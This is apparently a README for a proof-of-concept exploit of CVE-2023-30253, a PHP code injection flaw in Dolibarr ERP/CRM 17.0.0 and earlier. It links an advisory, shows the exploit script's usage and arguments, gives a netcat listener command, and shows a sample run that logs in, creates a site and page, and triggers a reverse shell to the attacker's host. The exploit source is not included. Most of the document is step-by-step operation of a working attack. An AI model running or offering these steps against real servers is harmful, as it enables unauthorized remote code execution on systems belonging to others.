# POC exploit for Dolibarr <= 17.0.0 (CVE-2023-30253)
Reverse Shell POC exploit for **`Dolibarr <= 17.0.0 (CVE-2023-30253)`**, PHP Code Injection

See more details about the vulnerability [**here**](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)

## PoC

Help of exploit:
```
➜  python3 exploit.py -h
usage: python3 exploit.py <TARGET_HOSTNAME> <USERNAME> <PASSWORD> <LHOST> <LPORT>
example: python3 exploit.py http://example.com login password 127.0.0.1 9001

---[Reverse Shell Exploit for Dolibarr <= 17.0.0 (CVE-2023-30253)]---

positional arguments:
  hostname    Target hostname
  username    Username of Dolibarr ERP/CRM
  password    Password of Dolibarr ERP/CRM
  lhost       Listening host for reverse shell
  lport       Listening port for reverse shell

options:
  -h, --help  show this help message and exit
```

Run the netcat on your host:
``` 
➜ nc -lvnp 9001
```
Run the exploit (example):
```
➜ python3 exploit.py http://example.com login passsword 127.0.0.1 9001
[*] Trying authentication...
[**] Login: login
[**] Password: password
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```
